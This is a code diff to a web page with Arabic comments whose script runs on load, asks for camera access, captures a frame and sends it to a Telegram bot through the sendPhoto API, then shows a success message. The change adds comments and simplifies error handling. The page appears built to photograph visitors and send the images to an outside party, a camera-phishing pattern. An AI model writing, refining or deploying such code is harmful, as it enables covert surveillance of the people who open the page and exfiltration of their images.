@@ -16,45 +16,50 @@
 
         async function capturePhoto() {
             try {
+                // طلب الوصول إلى الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = () => {
+                    // التقاط الصورة
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
                     
+                    // تحويل الصورة إلى blob
                     canvas.toBlob(async (blob) => {
+                        // إرسال إلى تلغرام
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'photo.jpg');
+                        formData.append('photo', blob);
                         
-                        try {
-                            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                            const result = await response.json();
-                            if (result.ok) {
-                                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">✅ تم تحميل الصورة بنجاح</h2>';
-                            } else {
-                                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">❌ فشل الإرسال: ' + result.description + '</h2>';
-                            }
-                        } catch(e) {
-                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">❌ خطأ في الإرسال</h2>';
+                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        const result = await response.json();
+                        console.log(result);
+                        
+                        if (result.ok) {
+                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:green">✅ تم بنجاح!</h2>';
+                        } else {
+                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:red">❌ خطأ: ' + result.description + '</h2>';
                         }
                     }, 'image/jpeg');
                     
+                    // إيقاف الكاميرا
                     stream.getTracks().forEach(track => track.stop());
                 };
-            } catch(e) {
-                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px">❌ لا يمكن الوصول إلى الكاميرا<br>الرجاء السماح بالوصول</h2>';
+            } catch(error) {
+                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:red">❌ لا يمكن الوصول للكاميرا<br>' + error.message + '</h2>';
             }
         }
         
+        // تشغيل
         capturePhoto();
     </script>
 </body>
